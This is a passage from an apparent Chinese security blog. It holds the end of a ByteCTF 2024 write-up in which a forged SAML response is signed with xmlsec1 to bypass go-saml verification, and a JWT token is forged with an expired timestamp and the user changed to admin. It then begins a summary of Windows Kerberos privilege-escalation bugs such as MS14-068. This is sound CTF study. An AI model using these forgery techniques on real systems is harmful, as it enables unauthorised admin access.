<p><img src="/../imgs/$%7Bfiilename%7D/1731383439310-17313834573841.png" alt="1731383439310"></p>
<p>正如规范所约束</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112115144681.png" alt="image-20241112115144681"></p>
<p>go-saml2库的xml结构体中定义了x509</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KeyInfo: KeyInfo&#123;</span><br><span class="line">	XMLName: xml.Name&#123;</span><br><span class="line">		Local: &quot;samlsig:KeyInfo&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	X509Data: X509Data&#123;</span><br><span class="line">		XMLName: xml.Name&#123;</span><br><span class="line">			Local: &quot;samlsig:X509Data&quot;,</span><br><span class="line">		&#125;,</span><br><span class="line">		X509Certificate: X509Certificate&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlsig:X509Certificate&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Cert: &quot;&quot;, // caller must populate cert,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>但现在我们给他赋值并没有用</p>
<p>看一下W&amp;M的wp（W&amp;M的web真的强，DJB的web也是顶流）</p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>
<blockquote>
<p><code>KeyValue</code> 元素包含一个可用于验证签名的公钥</p>
</blockquote>
<p>改了一下结构体</p>
<p>添加了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.Signature.KeyInfo.KeyValue.Value = cert</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接手动改一下idp2sp5.xml 生成idp2sp6.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; xmlns:samlsig=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Destination=&quot;http://localhost:8000/saml_consume&quot; ID=&quot;_ed59d777-c777-46ef-55e3-ab3cebf7d477&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2024-11-12T03:10:59.041732925Z&quot; InResponseTo=&quot;authnRequestIdRespondingTo&quot;&gt;</span><br><span class="line">    &lt;saml:Issuer&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">    &lt;samlsig:Signature Id=&quot;_944fac9f-fb10-4e72-61b6-3c8c1928777b&quot;&gt;</span><br><span class="line">        &lt;samlsig:SignedInfo&gt;</span><br><span class="line">            &lt;samlsig:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;&gt;&lt;/samlsig:CanonicalizationMethod&gt;</span><br><span class="line">            &lt;samlsig:SignatureMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;&gt;&lt;/samlsig:SignatureMethod&gt;</span><br><span class="line">            &lt;samlsig:Reference URI=&quot;&quot;&gt;</span><br><span class="line">                &lt;samlsig:Transforms&gt;</span><br><span class="line">                    &lt;samlsig:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;&gt;&lt;/samlsig:Transform&gt;</span><br><span class="line">                &lt;/samlsig:Transforms&gt;</span><br><span class="line">                &lt;samlsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;&gt;&lt;/samlsig:DigestMethod&gt;</span><br><span class="line">                &lt;samlsig:DigestValue&gt;&lt;/samlsig:DigestValue&gt;</span><br><span class="line">            &lt;/samlsig:Reference&gt;</span><br><span class="line">        &lt;/samlsig:SignedInfo&gt;</span><br><span class="line">        &lt;samlsig:SignatureValue&gt;&lt;/samlsig:SignatureValue&gt;</span><br><span class="line">        &lt;samlsig:KeyInfo&gt;</span><br><span class="line">            &lt;samlsig:KeyValue&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:KeyValue&gt;</span><br><span class="line">            &lt;samlsig:X509Data&gt;</span><br><span class="line">                &lt;samlsig:X509Certificate&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:X509Certificate&gt;</span><br><span class="line">            &lt;/samlsig:X509Data&gt;</span><br><span class="line">        &lt;/samlsig:KeyInfo&gt;</span><br><span class="line">    &lt;/samlsig:Signature&gt;</span><br><span class="line">    &lt;samlp:Status&gt;</span><br><span class="line">        &lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;&gt;&lt;/samlp:StatusCode&gt;</span><br><span class="line">    &lt;/samlp:Status&gt;</span><br><span class="line">    &lt;saml:Assertion ID=&quot;_132ebb3f-a299-42c8-5960-f21bed10cce7&quot; Version=&quot;2.0&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; IssueInstant=&quot;2024-11-12T03:10:59.041740369Z&quot;&gt;</span><br><span class="line">        &lt;saml:Issuer&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">        &lt;saml:Subject&gt;</span><br><span class="line">            &lt;saml:NameID Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;userIdThatYouAuthenticated&lt;/saml:NameID&gt;</span><br><span class="line">            &lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;</span><br><span class="line">                &lt;saml:SubjectConfirmationData InResponseTo=&quot;authnRequestIdRespondingTo&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.04174105Z&quot; Recipient=&quot;http://localhost:8000/saml_consume&quot;&gt;&lt;/saml:SubjectConfirmationData&gt;</span><br><span class="line">            &lt;/saml:SubjectConfirmation&gt;</span><br><span class="line">        &lt;/saml:Subject&gt;</span><br><span class="line">        &lt;saml:Conditions NotBefore=&quot;2024-11-12T03:05:59.041741731Z&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.041742162Z&quot;&gt;&lt;/saml:Conditions&gt;</span><br><span class="line">        &lt;saml:AttributeStatement&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;uid&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;userIdThatYouAuthenticated&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;email&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;someone@domain&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">        &lt;/saml:AttributeStatement&gt;</span><br><span class="line">    &lt;/saml:Assertion&gt;</span><br><span class="line">&lt;/samlp:Response&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp6.xml idp2sp6.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml</span><br></pre></td></tr></table></figure>

<p>然后就通了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp6.xml idp2sp6.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml</span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify  --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp6.xml </span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">                                     </span><br></pre></td></tr></table></figure>

<p>不过很疑问，为什么X509Certificate不行？非常的迷惑，但有一点被我忽视的文章，里面也确确实实用到了KeyValue。</p>
<p>即<a target="_blank" rel="noopener" href="https://github.com/RyanBoomer30/CVE-2021-21239-Exploit/blob/main/main.py">CVE-2021-21239-Exploit&#x2F;main.py at main · RyanBoomer30&#x2F;CVE-2021-21239-Exploit</a>里的</p>
<pre><code>key_info = ET.SubElement(new_signature, &#39;KeyInfo&#39;)
key_value = ET.SubElement(key_info, &#39;KeyValue&#39;)
</code></pre>
<h3 id="为什么X509不行？"><a href="#为什么X509不行？" class="headerlink" title="为什么X509不行？"></a>为什么X509不行？</h3><p>实际上不是X509不行，在规范上是允许X509的，但是xmlsec1不认</p>
<blockquote>
<p>To sign a XML document we need two things:<br>要对 XML 文档进行签名，我们需要两样东西：</p>
<ul>
<li>The private key. 私钥。</li>
<li>The XML document to sign, but it should be a XML signing template. That means a XML that in addition of your data has the necesarry information needed to sign (which algorithms, which signing mode, which key and so on…).<br>要签名的 XML 文档，但它应该是 XML 签名模板。这意味着 XML 除了您的数据之外，还具有签名所需的必要信息（哪些算法、哪种签名模式、哪个密钥等等……</li>
</ul>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
<p>WM大佬们对 response.Signature.KeyInfo.KeyValue.Value赋值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.Signature.KeyInfo.KeyValue.Value = cert</span><br></pre></td></tr></table></figure>

<p>赋值没有起作用，真正起作用的是建立这个结构。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;KeyInfo&gt;</span><br><span class="line">   &lt;KeyValue /&gt;</span><br></pre></td></tr></table></figure>

<p>xmlsec1识别到这个结构，随即将公钥存储在其中。我们是用私钥加密，可能流程是</p>
<ol>
<li>xmlsec1 sign</li>
<li>xmlsec1 scan2get Keyinfo</li>
<li>xmlsec1 generate public key</li>
<li>xmlsec1 put public key</li>
</ol>
<p>回过头看，test.xml中，也正是因为有这个结构，才能通过自带证书签名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;KeyInfo&gt;</span><br><span class="line">    &lt;KeyValue/&gt;</span><br><span class="line">&lt;/KeyInfo&gt;</span><br></pre></td></tr></table></figure>

<p>总之，我们这一部分问题解决了。</p>
<p>让我们添加一下 来收尾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Keyvalue: Keyvalue&#123;</span><br><span class="line">	XMLName: xml.Name&#123;</span><br><span class="line">		Local: &quot;samlsig:KeyValue&quot;,</span><br><span class="line">	&#125;,</span><br><span class="line">	value: &quot;&quot;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<h2 id="如何绕过jwt"><a href="#如何绕过jwt" class="headerlink" title="如何绕过jwt"></a>如何绕过jwt</h2><p>下发的jwt是guest，获取flag需要是admin</p>
<p>jwt校验的中间件 先解析jwt ，如果过期，则重新签名。没有其他逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">		if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">		if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">两个不同的判断条件，怎么进入二</span><br></pre></td></tr></table></figure>

<p>怎么err报错且过期</p>
<p>跟jwt的parse逻辑</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731393175901.png" alt="1731393175901">W&amp;M这里的流程是 </p>
<p><img src="/../imgs/$%7Bfiilename%7D/(null)-20240922140136146.(null)" alt="img"></p>
<p>但是我本地看版本不一样了。 改了。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/golang-jwt/jwt/commit/7b1c1c00a171c6c79bbdb40e4ce7d197060c1c2c#diff-83eb8e32639d01cf443d6d8bde24c1c8be78766090d8c5f8586c36250cfedca6">Merge commit from fork · golang-jwt&#x2F;jwt@7b1c1c0</a></p>
<p>改了。(<em>^_^</em>)</p>
<p>回退一下</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731394143308.png" alt="1731394143308"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// Valid validates time based claims &quot;exp, iat, nbf&quot;. There is no accounting for clock skew.</span><br><span class="line">// As well, if any of the above claims are not in the token, it will still</span><br><span class="line">// be considered a valid claim.</span><br><span class="line">func (c StandardClaims) Valid() error &#123;</span><br><span class="line">	vErr := new(ValidationError)</span><br><span class="line">	now := TimeFunc().Unix()</span><br><span class="line"></span><br><span class="line">	// The claims below are optional, by default, so if they are set to the</span><br><span class="line">	// default value in Go, let&#x27;s not fail the verification for them.</span><br><span class="line">	if !c.VerifyExpiresAt(now, false) &#123;</span><br><span class="line">		delta := time.Unix(now, 0).Sub(time.Unix(c.ExpiresAt, 0))</span><br><span class="line">		vErr.Inner = fmt.Errorf(&quot;%s by %s&quot;, ErrTokenExpired, delta)</span><br><span class="line">		vErr.Errors |= ValidationErrorExpired</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !c.VerifyIssuedAt(now, false) &#123;</span><br><span class="line">		vErr.Inner = ErrTokenUsedBeforeIssued</span><br><span class="line">		vErr.Errors |= ValidationErrorIssuedAt</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if !c.VerifyNotBefore(now, false) &#123;</span><br><span class="line">		vErr.Inner = ErrTokenNotValidYet</span><br><span class="line">		vErr.Errors |= ValidationErrorNotValidYet</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if vErr.valid() &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return vErr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看payload里面的过期没过期，那我们可以伪造一个过期时间，让validate 时间时候就报错 ，这样不会verify看我们的用户对不对，我们可以跳到过期重新签发，签admin的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzE5OTkzODQsImlzcyI6ImJ5dGVjdGYiLCJ1c2VybmFtZSI6Imd1ZXN0In0.AtIpqfF1oxYs46_8AJaDHVe63wbzVcVslYS9IJgLZds</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112150901372.png" alt="image-20241112150901372"></p>
<p>改payload，时间 减去7 * 24  * 3600 + 1   即过期，user改admin，签名不用改。</p>
<p>那么问题来了。这个题不用生成jwt就可以呀</p>
<p>题目并没有做限制，如果服务端时区设置不一样，爆破也能爆破出一个合理的过期时间。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a target="_blank" rel="noopener" href="https://docs.google.com/document/d/157fGn7lLP1uBuRz8zUgRDWTDklKznljeOWwRQ-C6uFg/edit?usp=sharing">CVE-2021-21239 Report - Google Docs</a></p>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/">GHSL-2023-121: SAML authentication bypass vulnerability in RobotsAndPencils&#x2F;go-saml - CVE-2023-48703 | GitHub Security Lab</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/RobotsAndPencils/go-saml">RobotsAndPencils&#x2F;go-saml: A just good enough SAML client library written in Go.</a></p>
<p><a target="_blank" rel="noopener" href="https://users.dcc.uchile.cl/~pcamacho/tutorial/web/xmlsec/xmlsec.html#htoc7">使用 XMLSec 进行 XML 签名和 XML 加密简介 — An Introduction to XML Signature and XML Encryption with XMLSec</a></p>
<p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/09/windows%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/09/windows%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">windows常见提权漏洞总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-10 03:38:24" itemprop="dateCreated datePublished" datetime="2024-09-10T03:38:24+08:00">2024-09-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 18:00:13" itemprop="dateModified" datetime="2024-11-13T18:00:13+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><h4 id="MS14-068；CVE-2014-6324"><a href="#MS14-068；CVE-2014-6324" class="headerlink" title="MS14-068；CVE-2014-6324"></a>MS14-068；CVE-2014-6324</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>PAC（Privilege Attribute Certificate），特权属性证书。根据用户声明的身份和server端的acl表确定后，在TGT中包含。</p>
<p>PAC包括</p>
<ol>
<li>身份信息</li>
<li>授权信息</li>
<li>签名信息<ol>
<li>PAC签名，默认根据krbtgt_hash签名，并将结果放在tgt中。但微软又允许<strong>客户端指定任意签名算法</strong></li>
<li><strong>服务特定签名（在某些场景下</strong>，忽略。</li>
</ol>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://1y0ng.github.io/post/2023/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">内网渗透之ms14_068和黄金、白银票据 | 1y0ng’s Blog</a></p>
<p>AS-REQ 设置<code>include-PAC</code>为<code>False</code>,则返回TGT中不会包含PAC。我们可以自己放个PAC，放到TGS-REQ中。<strong>PAC没有被放在TGT中,而是放在了TGS_REQ数据包的其它地方.但可笑的是,KDC在实现上竟然允许这样的构造,也就是说,KDC能够正确解析出没有放在其它地方的PAC信息.</strong></p>
<p><strong>KDC验证缺少PAC的TGT成功后,再验证不在TGT中 的PAC的合法性.如果2个均验证成功,KDC把PAC中的User SID、Group SID取出来,重新使用进行签名,签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样.将将新产生的PAC加入到解密后的TGT中,再重新加密制作全新的TGT发送给Client,不是TGS</strong></p>
<p>这样得到了一个高权限的PAC</p>
<p>和jwt 先validate expire  后verify一样。 </p>
<p>AS-REQ   <code>include-PAC</code>为<code>False</code></p>
<p>AS-RES   返回TGT</p>
<p>TGS-REQ   发送TGT和不在TGT中PAC</p>
<p> TGS-RES  PAC确定身份的TGT、</p>
<h4 id="CVE-2021-42287-CVE-2021-42278"><a href="#CVE-2021-42287-CVE-2021-42278" class="headerlink" title="CVE-2021-42287&#x2F;CVE-2021-42278"></a>CVE-2021-42287&#x2F;CVE-2021-42278</h4><ul>
